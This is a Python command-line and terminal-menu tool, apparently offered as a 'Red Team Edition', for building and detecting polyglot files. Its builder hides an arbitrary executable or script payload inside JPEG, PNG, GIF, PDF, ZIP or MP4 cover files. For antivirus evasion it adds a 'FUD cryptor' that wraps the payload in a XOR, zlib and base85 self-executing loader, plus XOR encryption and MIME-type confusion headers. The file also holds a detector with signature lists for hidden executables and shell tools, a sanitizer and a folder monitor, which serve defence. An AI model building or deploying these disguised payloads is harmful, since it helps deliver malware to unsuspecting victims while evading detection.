#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  POLYGLOT TOOLKIT v2.0 — Red Team Edition                    ║
║  TUI (Terminal User Interface) + CLI                         ║
║  Author: Mr-DS-ML-85                                         ║
╚══════════════════════════════════════════════════════════════╝

Usage:
  polyglot tui                    Interactive TUI menu
  polyglot build <cover> <payload> [--type jpeg] [--encrypt] [--fud]
  polyglot scan <file_or_dir>
  polyglot sanitize <file_or_dir> [--no-backup]
  polyglot monitor <dir>
"""

import sys
import os
import struct
import math
import zlib
import base64
import hashlib
import shutil
import random
import time
import platform
import subprocess
import threading
from datetime import datetime
from pathlib import Path
from collections import deque

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.columns import Columns
    from rich.align import Align
    from rich.markdown import Markdown
    from rich.style import Style
    from rich.theme import Theme as RichTheme
    from rich import box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

# ── Rich Theme ───────────────────────────────────────────────

THEME = RichTheme({
    "danger": "bold red",
    "success": "bold green",
    "warning": "bold yellow",
    "info": "bold blue",
    "accent": "bold cyan",
    "dim": "dim white",
    "critical": "bold white on red",
    "high": "bold red",
    "medium": "yellow",
    "low": "dim cyan",
})

console = Console(theme=THEME) if HAS_RICH else None


# ── Cross-Platform Notifications ────────────────────────────

class Notifier:
    @staticmethod
    def send(title, message, urgency="normal"):
        system = platform.system()
        try:
            if system == "Linux":
                subprocess.run(["notify-send", "-u", urgency, "-a", "Polyglot Toolkit", title, message],
                             capture_output=True, timeout=5)
            elif system == "Darwin":
                subprocess.run(["osascript", "-e",
                    f'display notification "{message}" with title "{title}"'],
                    capture_output=True, timeout=5)
            elif system == "Windows":
                try:
                    import winsound
                    winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
                except Exception:
                    pass
        except Exception:
            pass


# ── Builder Engine ───────────────────────────────────────────

class PolyglotBuilder:
    def entropy(self, data: bytes) -> float:
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        return -sum((f / length) * math.log2(f / length) for f in freq if f > 0)

    def xor_crypt(self, data: bytes, key: bytes) -> bytes:
        key_exp = (key * (len(data) // len(key) + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_exp))

    def fud_obfuscate(self, payload: bytes) -> bytes:
        """FUD cryptor — multi-layer obfuscation."""
        key = os.urandom(32)
        encrypted = self.xor_crypt(payload, key)
        compressed = zlib.compress(encrypted, 9)
        encoded = base64.b85encode(compressed)
        stub = b'#!/usr/bin/env python3\n'
        stub += b'import base64,zlib,os,sys\n'
        stub += f'k="{key.hex()}"\n'.encode()
        stub += b'd=base64.b85decode(b"' + base64.b85encode(compressed) + b'")\n'
        stub += b'k=bytes.fromhex(k)\n'
        stub += b'd=bytes(a^b for a,b in zip(d,(k*(len(d)//len(k)+1))[:len(d)]))\n'
        stub += b'exec(compile(zlib.decompress(d),"<fud>","exec"))\n'
        return stub

    def mime_confusion(self, data: bytes, fake_ext: str) -> bytes:
        headers = {
            '.jpg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
            '.png': b'\x89PNG\r\n\x1a\n',
            '.gif': b'GIF89a\x01\x00\x01\x00\x80\x00\x00',
            '.pdf': b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n',
            '.mp4': b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00isomiso2',
            '.zip': b'PK\x03\x04\x14\x00\x00\x00\x00\x00',
        }
        return headers.get(fake_ext, b'') + data

    def build(self, cover_path, payload_path, output_path,
              container_type="jpeg", encrypt=False, fud=False, mime_confuse=False):
        with open(cover_path, 'rb') as f:
            cover = f.read()
        with open(payload_path, 'rb') as f:
            payload = f.read()

        original_payload = payload
        key = None

        if fud:
            payload = self.fud_obfuscate(payload)
        if encrypt:
            key = os.urandom(32)
            payload = self.xor_crypt(payload, key)
        if mime_confuse:
            ext = os.path.splitext(cover_path)[1]
            payload = self.mime_confusion(payload, ext)

        builders = {
            'jpeg': self._b_jpeg, 'jpg': self._b_jpeg,
            'png': self._b_png, 'gif': self._b_gif,
            'pdf': self._b_pdf, 'zip': self._b_zip,
            'mp4': self._b_mp4,
        }

        builder = builders.get(container_type.lower())
        if not builder:
            raise ValueError(f"Unsupported: {container_type}")

        polyglot = builder(cover, payload)

        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.', exist_ok=True)
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        return {
            'output': output_path,
            'container_type': container_type.upper(),
            'cover_size': len(cover),
            'payload_size': len(original_payload),
            'output_size': len(polyglot),
            'payload_offset': len(polyglot) - len(payload),
            'encrypted': encrypt,
            'fud_protected': fud,
            'mime_confused': mime_confuse,
            'entropy': round(self.entropy(payload), 2),
        }

    def _b_jpeg(self, c, p):
        if c[:2] != b'\xff\xd8': raise ValueError("Not JPEG")
        e = c.rfind(b'\xff\xd9')
        if e == -1: raise ValueError("No EOI")
        return c[:e+2] + b'\xff\xfe' + struct.pack('<H', min(len(p), 65533)) + p

    def _b_png(self, c, p):
        if c[:8] != b'\x89PNG\r\n\x1a\n': raise ValueError("Not PNG")
        e = c.rfind(b'IEND')
        if e == -1: raise ValueError("No IEND")
        return c[:e+8] + p

    def _b_gif(self, c, p):
        if c[:6] not in (b'GIF87a', b'GIF89a'): raise ValueError("Not GIF")
        e = c.rfind(b'\x3b')
        if e == -1: raise ValueError("No terminator")
        return c[:e+1] + b'\x00'*16 + p

    def _b_pdf(self, c, p):
        if not c.startswith(b'%PDF'): raise ValueError("Not PDF")
        e = c.rfind(b'%%EOF')
        if e == -1: raise ValueError("No EOF")
        return c[:e+5] + b'\r\n' + p

    def _b_zip(self, c, p):
        if c[:2] != b'PK': raise ValueError("Not ZIP")
        e = c.rfind(b'\x50\x4b\x05\x06')
        if e == -1: raise ValueError("No EOCD")
        return c[:e] + p + c[e:]

    def _b_mp4(self, c, p):
        if b'ftyp' not in c[:20]: raise ValueError("Not MP4")
        atom = struct.pack('>I', len(p)+8) + b'free'
        return c + atom + p


# ── Detector Engine ──────────────────────────────────────────

class PolyglotDetector:
    SIGS = {
        'PE/EXE': b'MZ', 'ELF': b'\x7fELF', 'PDF': b'%PDF',
        'ZIP': b'PK', 'RAR': b'Rar!', '7Z': b'7z',
        'GZIP': b'\x1f\x8b', 'BAT': b'@echo', 'PS1': b'powershell',
        'SH': b'#!/bin/', 'CLASS': b'\xca\xfe\xba\xbe',
        'MACHO': b'\xfe\xed\xfa', 'LNK': b'\x4c\x00\x00\x00',
        'VBS': b'CreateObject', 'JSCRIPT': b'function(',
        'HTA': b'<hta:', 'SCRIPT': b'<script', 'CMD': b'cmd.exe',
    }

    def entropy(self, data):
        if not data: return 0.0
        freq = [0]*256
        for b in data: freq[b] += 1
        l = len(data)
        return -sum((f/l)*math.log2(f/l) for f in freq if f > 0)

    def scan_file(self, filepath):
        findings = []
        try:
            with open(filepath, 'rb') as f:
                data = f.read()
        except Exception as e:
            return [{'type':'ERROR','detail':str(e),'severity':'error','offset':0}]

        ext = os.path.splitext(filepath)[1].lower()
        ct = None
        if data[:2]==b'\xff\xd8': ct='JPEG'
        elif data[:8]==b'\x89PNG\r\n\x1a\n': ct='PNG'
        elif data[:6] in (b'GIF87a',b'GIF89a'): ct='GIF'
        elif data[:4]==b'%PDF': ct='PDF'
        elif data[:2]==b'PK': ct='ZIP'
        elif b'ftyp' in data[:20]: ct='MP4'
        elif data[:2]==b'MZ': ct='PE'
        elif data[:4]==b'\x7fELF': ct='ELF'

        exp = {'.jpg':'JPEG','.jpeg':'JPEG','.png':'PNG','.gif':'GIF',
               '.pdf':'PDF','.zip':'ZIP','.mp4':'MP4'}.get(ext)
        if exp and ct and exp != ct:
            findings.append({'type':'EXTENSION_MISMATCH',
                'detail':f'Ext={exp}, Content={ct}','severity':'critical','offset':0})

        for name, sig in self.SIGS.items():
            off = data.find(sig, 64)
            if off != -1:
                sev = 'high' if name in ('PE/EXE','ELF','LNK') else 'warning'
                findings.append({'type':'HIDDEN_SIG','detail':f'{name} @ 0x{off:X}',
                    'severity':sev,'offset':off})

        markers = {'JPEG':(b'\xff\xd9',2),'PNG':(b'IEND',8),'GIF':(b'\x3b',1),'PDF':(b'%%EOF',5)}
        if ct in markers:
            m, extra = markers[ct]
            pos = data.rfind(m)
            if pos != -1 and pos+extra < len(data):
                t = len(data)-pos-extra
                findings.append({'type':'TRAILING_DATA',
                    'detail':f'{t:,} bytes after {ct} end — hidden payload',
                    'severity':'critical','offset':pos+extra})

        ss = max(len(data)//8, 1)
        for i in range(8):
            s = data[i*ss:(i+1)*ss]
            if len(s) < 100: continue
            e = self.entropy(s)
            if e > 7.5:
                findings.append({'type':'HIGH_ENTROPY',
                    'detail':f'Section {i+1}/8: {e:.2f}','severity':'info','offset':i*ss})

        if data[:4]==b'%PDF' and data.find(b'MZ',100)!=-1:
            findings.append({'type':'MIME_CONFUSION',
                'detail':'PDF+PE — MIME confusion','severity':'critical','offset':data.find(b'MZ',100)})
        if data[:2]==b'\xff\xd8' and data.find(b'PK',100)!=-1:
            findings.append({'type':'MIME_CONFUSION',
                'detail':'JPEG+ZIP — MIME confusion','severity':'critical','offset':data.find(b'PK',100)})

        return findings


# ── Sanitizer Engine ─────────────────────────────────────────

class PolyglotSanitizer:
    def sanitize(self, filepath, backup=True):
        with open(filepath, 'rb') as f:
            data = f.read()
        orig = len(data)
        ext = os.path.splitext(filepath)[1].lower()
        cleaned = None
        detected = None

        handlers = {('.jpg','.jpeg'):('JPEG',b'\xff\xd9',2),('.png',):('PNG',b'IEND',8),
                    ('.gif',):('GIF',b'\x3b',1),('.pdf',):('PDF',b'%%EOF',5)}
        for exts,(name,m,extra) in handlers.items():
            if ext in exts or data[:2]==m[:2]:
                pos = data.rfind(m)
                if pos!=-1 and pos+extra<len(data):
                    cleaned = data[:pos+extra]; detected = name
                break

        if ext=='.zip' or data[:2]==b'PK':
            eocd = data.rfind(b'\x50\x4b\x05\x06')
            if eocd!=-1 and eocd+22<len(data):
                cleaned = data[:eocd+22]; detected = 'ZIP'

        if cleaned is None or len(cleaned)>=orig:
            return {'status':'clean','detail':f'{detected or "Unknown"}: clean','removed':0}

        if backup: shutil.copy2(filepath, filepath+'.bak')
        with open(filepath,'wb') as f: f.write(cleaned)
        return {'status':'sanitized','detail':f'{detected}: {orig-len(cleaned):,} bytes removed',
                'removed':orig-len(cleaned),'backup':filepath+'.bak' if backup else None}


# ── TUI Application ─────────────────────────────────────────

class PolyglotTUI:
    def __init__(self):
        self.builder = PolyglotBuilder()
        self.detector = PolyglotDetector()
        self.sanitizer = PolyglotSanitizer()
        self.stats = {'scanned':0,'threats':0,'sanitized':0,'built':0}
        self.alerts = deque(maxlen=50)

    def banner(self):
        if not HAS_RICH:
            print("Polyglot Toolkit v2.0 — Red Team Edition")
            return

        banner_text = """
[red]╔══════════════════════════════════════════════════════════╗
║[/red]  [bold white]◆ POLYGLOT TOOLKIT v2.0[/bold white]                                [red]║
║[/red]  [dim]Red Team Edition[/dim]                                         [red]║
║[/red]  [dim]Author: Mr-DS-ML-85[/dim]                                      [red]║
╚══════════════════════════════════════════════════════════╝[/red]"""
        console.print(banner_text)

    def main_menu(self):
        self.banner()
        while True:
            console.print()
            console.print(Panel.fit(
                "[bold white]MAIN MENU[/bold white]\n"
                "[dim]─────────────────────────────────────[/dim]\n\n"
                "  [bold red]1[/bold red] │ ◆  [white]Polyglot Builder[/white]\n"
                "  [bold red]2[/bold red] │ ⚠  [white]File Detector[/white]\n"
                "  [bold red]3[/bold red] │ 🛡  [white]File Sanitizer[/white]\n"
                "  [bold red]4[/bold red] │ ▶  [white]Real-Time Monitor[/white]\n"
                "  [bold red]5[/bold red] │ 📊 [white]Dashboard & Stats[/white]\n"
                "  [bold red]6[/bold red] │ 📋 [white]Activity Log[/white]\n"
                "  [bold red]0[/bold red] │ ✕  [dim]Exit[/dim]\n",
                title="[bold red]◆ POLYGLOT[/bold red]",
                subtitle="[dim]v2.0 — Red Team Edition[/dim]",
                border_style="red",
                padding=(1, 2),
            ))

            choice = Prompt.ask("\n[bold red]Select[/bold red]", choices=["0","1","2","3","4","5","6"],
                              default="1")

            if choice == "0":
                console.print("\n[dim]Stay stealthy. ── Mr-DS-ML-85[/dim]\n")
                sys.exit(0)
            elif choice == "1":
                self.menu_builder()
            elif choice == "2":
                self.menu_detector()
            elif choice == "3":
                self.menu_sanitizer()
            elif choice == "4":
                self.menu_monitor()
            elif choice == "5":
                self.menu_dashboard()
            elif choice == "6":
                self.menu_log()

    # ── Builder Menu ─────────────────────────────────────────

    def menu_builder(self):
        console.print()
        console.print(Panel("[bold red]◆ POLYGLOT BUILDER[/bold red]", border_style="red"))

        console.print("\n[bold]Attack Vectors:[/bold]")
        console.print("  [red]1[/red] │ Standard Polyglot (trailing data)")
        console.print("  [red]2[/red] │ FUD Cryptor (multi-layer obfuscation)")
        console.print("  [red]3[/red] │ MIME-Type Confusion")
        console.print("  [red]4[/red] │ Covert Archive Embedding")

        vector = Prompt.ask("\n[bold red]Vector[/bold red]", choices=["1","2","3","4"], default="1")

        cover = Prompt.ask("[bold cyan]Cover file[/bold cyan] (JPEG/PNG/GIF/PDF/ZIP/MP4)")
        if not os.path.isfile(cover):
            console.print(f"[red]✗ File not found: {cover}[/red]")
            return

        payload = Prompt.ask("[bold cyan]Payload file[/bold cyan] (EXE/BAT/VBS/script)")
        if not os.path.isfile(payload):
            console.print(f"[red]✗ File not found: {payload}[/red]")
            return

        containers = ['jpeg','png','gif','pdf','zip','mp4']
        container = Prompt.ask("[bold cyan]Container type[/bold cyan]", choices=containers, default="jpeg")

        encrypt = Confirm.ask("[bold cyan]XOR encrypt payload?[/bold cyan]", default=False)
        fud = vector == "2"
        mime = vector == "3"

        output = Prompt.ask("[bold cyan]Output file[/bold cyan]",
                          default=f"polyglot.{container}")

        console.print()
        with Progress(SpinnerColumn(), TextColumn("[bold blue]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Building polyglot...", total=100)
            try:
                progress.update(task, advance=30)
                stats = self.builder.build(cover, payload, output,
                    container_type=container, encrypt=encrypt, fud=fud, mime_confuse=mime)
                progress.update(task, advance=70)
            except Exception as e:
                console.print(f"\n[bold red]✗ ERROR: {e}[/bold red]")
                return

        progress.update(task, completed=100)

        console.print()
        table = Table(title="Build Result", box=box.ROUNDED, border_style="green")
        table.add_column("Property", style="cyan")
        table.add_column("Value", style="white")
        table.add_row("Output", stats['output'])
        table.add_row("Container", stats['container_type'])
        table.add_row("Cover Size", f"{stats['cover_size']:,} bytes")
        table.add_row("Payload Size", f"{stats['payload_size']:,} bytes")
        table.add_row("Output Size", f"{stats['output_size']:,} bytes")
        table.add_row("Payload Offset", f"0x{stats['payload_offset']:X}")
        table.add_row("Entropy", str(stats['entropy']))
        table.add_row("Encrypted", "✓" if stats['encrypted'] else "✗")
        table.add_row("FUD Protected", "✓" if stats['fud_protected'] else "✗")
        table.add_row("MIME Confusion", "✓" if stats['mime_confused'] else "✗")
        console.print(table)

        self.stats['built'] += 1
        console.print(f"\n[bold green]✓ Polyglot built successfully![/bold green]")
        Notifier.send("Polyglot Built", f"{container} polyglot created")

    # ── Detector Menu ────────────────────────────────────────

    def menu_detector(self):
        console.print()
        console.print(Panel("[bold yellow]⚠ POLYGLOT DETECTOR[/bold yellow]", border_style="yellow"))

        target = Prompt.ask("[bold cyan]Target[/bold cyan] (file or directory)")
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        if os.path.isfile(target):
            files = [target]
        else:
            exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                    '.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))

        if not files:
            console.print("[yellow]No scannable files found.[/yellow]")
            return

        console.print(f"\n[dim]Scanning {len(files)} files...[/dim]\n")

        threats = 0
        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Scanning...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)
                findings = self.detector.scan_file(fpath)
                self.stats['scanned'] += 1

                if findings:
                    crit = [f for f in findings if f['severity'] in ('critical','high')]
                    if crit:
                        threats += len(crit)
                        self.stats['threats'] += len(crit)
                        console.print(f"  [bold red]⚠ {fname}[/bold red]")
                        for f in findings:
                            sev = f['severity']
                            styles = {'critical':'bold white on red','high':'bold red',
                                     'warning':'yellow','info':'blue'}
                            off = f" @ 0x{f['offset']:X}" if f.get('offset') else ""
                            console.print(f"    [{styles.get(sev,'white')}][{sev.upper()}][/{styles.get(sev,'white')}] "
                                        f"{f['type']}: {f['detail']}{off}")
                    else:
                        console.print(f"  [yellow]○ {fname}[/yellow] [dim]— minor warnings[/dim]")
                else:
                    console.print(f"  [green]✓ {fname}[/green] [dim]— clean[/dim]")

                progress.advance(task)

        console.print()
        if threats > 0:
            console.print(Panel(
                f"[bold red]⚠ {threats} THREATS FOUND[/bold red]\n"
                f"[dim]{len(files)} files scanned[/dim]",
                border_style="red", title="Scan Complete"
            ))
            Notifier.send("THREATS DETECTED", f"{threats} threats in {len(files)} files", "critical")
        else:
            console.print(Panel(
                f"[bold green]✓ ALL CLEAN[/bold green]\n"
                f"[dim]{len(files)} files scanned, no threats[/dim]",
                border_style="green", title="Scan Complete"
            ))

    # ── Sanitizer Menu ───────────────────────────────────────

    def menu_sanitizer(self):
        console.print()
        console.print(Panel("[bold green]🛡 POLYGLOT SANITIZER[/bold green]", border_style="green"))

        target = Prompt.ask("[bold cyan]Target[/bold cyan] (file or directory)")
        if not os.path.exists(target):
            console.print(f"[red]✗ Not found: {target}[/red]")
            return

        backup = Confirm.ask("[bold cyan]Create .bak backups?[/bold cyan]", default=True)

        if os.path.isfile(target):
            files = [target]
        else:
            exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.zip','.mp4'}
            files = []
            for root, dirs, fnames in os.walk(target):
                dirs[:] = [d for d in dirs if not d.startswith('.')]
                for f in fnames:
                    if os.path.splitext(f)[1].lower() in exts:
                        files.append(os.path.join(root, f))

        if not files:
            console.print("[yellow]No sanitizable files found.[/yellow]")
            return

        console.print(f"\n[dim]Sanitizing {len(files)} files...[/dim]\n")

        sanitized = 0
        total_removed = 0

        with Progress(SpinnerColumn(), TextColumn("[bold]{task.description}"),
                     BarColumn(), TaskProgressColumn(), console=console) as progress:
            task = progress.add_task("Sanitizing...", total=len(files))

            for fpath in files:
                fname = os.path.basename(fpath)
                try:
                    result = self.sanitizer.sanitize(fpath, backup)
                    if result['status'] == 'sanitized':
                        sanitized += 1
                        total_removed += result['removed']
                        self.stats['sanitized'] += 1
                        console.print(f"  [green]✓ {fname}[/green] — {result['detail']}")
                    else:
                        console.print(f"  [dim]○ {fname} — {result['detail']}[/dim]")
                except Exception as e:
                    console.print(f"  [red]✗ {fname} — {e}[/red]")
                progress.advance(task)

        console.print()
        if sanitized > 0:
            console.print(Panel(
                f"[bold green]🛡 SANITIZED[/bold green]\n"
                f"[white]{sanitized}/{len(files)} files cleaned[/white]\n"
                f"[dim]{total_removed:,} bytes of hidden data removed[/dim]",
                border_style="green", title="Sanitization Complete"
            ))
            Notifier.send("Sanitization Done", f"{sanitized} files cleaned")
        else:
            console.print(Panel(
                "[bold blue]✓ ALL CLEAN[/bold blue]\n[dim]No hidden data found[/dim]",
                border_style="blue", title="Sanitization Complete"
            ))

    # ── Monitor Menu ─────────────────────────────────────────

    def menu_monitor(self):
        console.print()
        console.print(Panel("[bold cyan]▶ REAL-TIME MONITOR[/bold cyan]", border_style="cyan"))

        directory = Prompt.ask("[bold cyan]Watch directory[/bold cyan]",
                             default=str(Path.home() / "Downloads"))
        if not os.path.isdir(directory):
            console.print(f"[red]✗ Not a directory: {directory}[/red]")
            return

        console.print(f"\n[green]▶ Monitoring: {directory}[/green]")
        console.print("[dim]Press Ctrl+C to stop[/dim]\n")

        detector = self.detector
        file_hashes = {}
        scanned = 0
        threats = 0

        scan_exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                     '.zip','.exe','.dll','.scr','.bat','.cmd','.ps1','.vbs',
                     '.js','.hta','.lnk','.elf','.so','.mp4'}

        try:
            while True:
                for root, dirs, files in os.walk(directory):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for fname in files:
                        ext = os.path.splitext(fname)[1].lower()
                        if ext not in scan_exts:
                            continue
                        fpath = os.path.join(root, fname)
                        try:
                            st = os.stat(fpath)
                            cur = (st.st_mtime, st.st_size)
                        except OSError:
                            continue

                        prev = file_hashes.get(fpath)
                        if prev is None or prev != cur:
                            file_hashes[fpath] = cur
                            findings = detector.scan_file(fpath)
                            scanned += 1

                            crit = [f for f in findings if f['severity'] in ('critical','high')]
                            if crit:
                                threats += len(crit)
                                ts = datetime.now().strftime('%H:%M:%S')
                                console.print(f"[bold red]  [{ts}] ⚠ {fname}[/bold red]")
                                for f in crit[:3]:
                                    console.print(f"    [red]→ {f['detail']}[/red]")
                                Notifier.send(f"THREAT: {fname}", crit[0]['detail'][:100], "critical")
                            elif not findings:
                                console.print(f"  [dim]✓ {fname}[/dim]")

                time.sleep(3)
        except KeyboardInterrupt:
            console.print(f"\n\n[dim]Stopped. Scanned: {scanned} | Threats: {threats}[/dim]")

    # ── Dashboard ────────────────────────────────────────────

    def menu_dashboard(self):
        console.print()
        table = Table(title="📊 Dashboard", box=box.DOUBLE_EDGE, border_style="red",
                     title_style="bold white", padding=(0, 2))
        table.add_column("Metric", style="cyan", justify="right")
        table.add_column("Value", style="bold white", justify="center")
        table.add_column("Status", justify="center")

        s = self.stats
        table.add_row("🔍 Files Scanned", str(s['scanned']),
                     "[green]✓[/green]" if s['scanned'] > 0 else "[dim]—[/dim]")
        table.add_row("⚠ Threats Found", str(s['threats']),
                     "[red]⚠ ALERT[/red]" if s['threats'] > 0 else "[green]CLEAN[/green]")
        table.add_row("🛡 Files Sanitized", str(s['sanitized']),
                     "[green]✓[/green]" if s['sanitized'] > 0 else "[dim]—[/dim]")
        table.add_row("◆ Polyglots Built", str(s['built']),
                     "[yellow]●[/yellow]" if s['built'] > 0 else "[dim]—[/dim]")

        console.print(table)

        if self.alerts:
            console.print("\n[bold]Recent Alerts:[/bold]")
            for alert in list(self.alerts)[-10:]:
                console.print(f"  [red]⚠ {alert}[/red]")

    # ── Log ──────────────────────────────────────────────────

    def menu_log(self):
        console.print()
        if not self.alerts:
            console.print("[dim]No activity logged yet.[/dim]")
            return
        console.print(Panel("[bold]📋 Activity Log[/bold]", border_style="blue"))
        for entry in list(self.alerts):
            console.print(f"  {entry}")


# ── Direct CLI Commands ──────────────────────────────────────

def cli_build(args):
    """polyglot build <cover> <payload> [options]"""
    if len(args) < 2:
        console.print("[red]Usage: polyglot build <cover> <payload> [--type jpeg] [--encrypt] [--fud] [--mime][/red]")
        return

    cover, payload = args[0], args[1]
    container = "jpeg"
    encrypt = fud = mime = False
    output = None

    i = 2
    while i < len(args):
        if args[i] == "--type" and i+1 < len(args):
            container = args[i+1]; i += 2
        elif args[i] == "--encrypt":
            encrypt = True; i += 1
        elif args[i] == "--fud":
            fud = True; i += 1
        elif args[i] == "--mime":
            mime = True; i += 1
        elif args[i] == "--output" and i+1 < len(args):
            output = args[i+1]; i += 2
        else:
            i += 1

    if not output:
        output = f"polyglot.{container}"

    b = PolyglotBuilder()
    try:
        stats = b.build(cover, payload, output, container, encrypt, fud, mime)
        if HAS_RICH:
            table = Table(box=box.ROUNDED, border_style="green")
            table.add_column("Property", style="cyan")
            table.add_column("Value")
            for k, v in stats.items():
                table.add_row(str(k), str(v))
            console.print(table)
        else:
            for k, v in stats.items():
                print(f"  {k}: {v}")
    except Exception as e:
        print(f"ERROR: {e}", file=sys.stderr)
        sys.exit(1)


def cli_scan(args):
    """polyglot scan <file_or_dir>"""
    if not args:
        print("Usage: polyglot scan <file_or_dir>", file=sys.stderr)
        return

    target = args[0]
    d = PolyglotDetector()

    if os.path.isfile(target):
        files = [target]
    elif os.path.isdir(target):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                '.zip','.exe','.dll','.bat','.cmd','.ps1','.vbs','.js','.mp4'}
        files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if os.path.splitext(f)[1].lower() in exts:
                    files.append(os.path.join(root, f))
    else:
        print(f"Not found: {target}", file=sys.stderr)
        sys.exit(1)

    threats = 0
    for fpath in files:
        findings = d.scan_file(fpath)
        fname = os.path.basename(fpath)
        crit = [f for f in findings if f['severity'] in ('critical','high')]
        if crit:
            threats += len(crit)
            if HAS_RICH:
                console.print(f"[bold red]⚠ {fname}[/bold red]")
                for f in findings:
                    console.print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
            else:
                print(f"⚠ {fname}")
                for f in findings:
                    print(f"  [{f['severity']}] {f['type']}: {f['detail']}")
        else:
            if HAS_RICH:
                console.print(f"[green]✓ {fname}[/green]")
            else:
                print(f"✓ {fname}")

    if HAS_RICH:
        console.print(f"\n[bold]{'THREATS: '+str(threats) if threats else 'ALL CLEAN'}[/bold] — {len(files)} files")
    else:
        print(f"\n{'THREATS: '+str(threats) if threats else 'ALL CLEAN'} — {len(files)} files")


def cli_sanitize(args):
    """polyglot sanitize <file_or_dir> [--no-backup]"""
    if not args:
        print("Usage: polyglot sanitize <file_or_dir>", file=sys.stderr)
        return

    target = args[0]
    backup = "--no-backup" not in args
    s = PolyglotSanitizer()

    if os.path.isfile(target):
        files = [target]
    elif os.path.isdir(target):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.zip','.mp4'}
        files = []
        for root, dirs, fnames in os.walk(target):
            dirs[:] = [d for d in dirs if not d.startswith('.')]
            for f in fnames:
                if os.path.splitext(f)[1].lower() in exts:
                    files.append(os.path.join(root, f))
    else:
        print(f"Not found: {target}", file=sys.stderr)
        sys.exit(1)

    for fpath in files:
        result = s.sanitize(fpath, backup)
        fname = os.path.basename(fpath)
        if result['status'] == 'sanitized':
            if HAS_RICH:
                console.print(f"[green]✓ {fname}[/green] — {result['detail']}")
            else:
                print(f"✓ {fname} — {result['detail']}")
        else:
            if HAS_RICH:
                console.print(f"[dim]○ {fname} — {result['detail']}[/dim]")
            else:
                print(f"○ {fname} — {result['detail']}")


# ── Entry Point ──────────────────────────────────────────────

def main():
    args = sys.argv[1:]

    if not args:
        # No args → interactive TUI
        tui = PolyglotTUI()
        tui.main_menu()
    elif args[0] == "tui":
        tui = PolyglotTUI()
        tui.main_menu()
    elif args[0] == "build":
        cli_build(args[1:])
    elif args[0] == "scan":
        cli_scan(args[1:])
    elif args[0] == "sanitize":
        cli_sanitize(args[1:])
    elif args[0] == "monitor":
        tui = PolyglotTUI()
        tui.menu_monitor()
    elif args[0] in ("help", "--help", "-h"):
        print(__doc__)
    else:
        print(f"Unknown command: {args[0]}", file=sys.stderr)
        print("Commands: tui, build, scan, sanitize, monitor, help", file=sys.stderr)
        sys.exit(1)


if __name__ == '__main__':
    main()
